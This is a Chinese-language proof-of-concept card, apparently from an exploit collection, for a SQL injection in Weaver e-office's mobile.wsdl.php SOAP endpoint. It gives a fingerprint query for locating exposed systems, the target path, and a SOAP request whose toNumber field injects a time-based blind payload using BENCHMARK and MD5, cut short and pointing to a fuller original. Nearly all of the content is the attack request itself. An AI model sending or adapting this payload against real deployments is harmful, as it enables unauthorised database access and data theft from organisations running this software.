# 泛微e-officemobile.wsdl.php存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /webservice-json/mobile/mobile.wsdl.php HTTP/1.1`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
SOAPAction: urn:MobileServicewsdl#Send
Content-Type: text/xml;charset=UTF-8
Sleep: sleep
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:MobileServicewsdl">
<soapenv:Header/>
<soapenv:Body>
<urn:Send soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<fromNumber xsi:type="xsd:string">gero et</fromNumber>
<toNumber xsi:type="xsd:string">sonoras' AND 4400=BENCHMARK(4000000,MD5(0x686d4650))-- bbL…（脚本共 824 字，完整版见原文）
```
- **预期**：200　|　Send